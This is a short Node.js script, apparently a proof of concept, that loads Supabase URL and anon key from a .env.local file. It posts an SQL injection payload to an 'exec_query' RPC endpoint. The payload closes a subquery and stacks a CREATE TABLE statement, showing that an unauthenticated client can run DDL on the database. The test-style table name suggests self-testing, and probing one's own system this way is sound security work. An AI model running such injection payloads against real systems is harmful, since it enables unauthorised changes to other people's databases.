const fs = require('fs');
const path = require('path');

try {
  const envContent = fs.readFileSync('.env.local', 'utf8');
  const env = {};
  envContent.split(/\r?\n/).forEach(line => {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) return;
    const eqIdx = trimmed.indexOf('=');
    if (eqIdx === -1) return;
    const key = trimmed.slice(0, eqIdx).trim();
    const val = trimmed.slice(eqIdx + 1).trim().replace(/^['"]|['"]$/g, '');
    env[key] = val;
  });

  const url = `${env.NEXT_PUBLIC_SUPABASE_URL}/rest/v1/rpc/exec_query`;
  
  // Inject DDL
  const injectedSql = "SELECT 1) t; CREATE TABLE IF NOT EXISTS public.test_injection_table (id serial primary key, val text); SELECT json_build_object('success', true) AS status; --";

  fetch(url, {
    method: 'POST',
    headers: {
      'apikey': env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${env.NEXT_PUBLIC_SUPABASE_ANON_KEY}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      p_sql: injectedSql
    })
  })
  .then(r => r.json())
  .then(data => {
    console.log('Result:', data);
  })
  .catch(console.error);

} catch (err) {
  console.error(err);
}
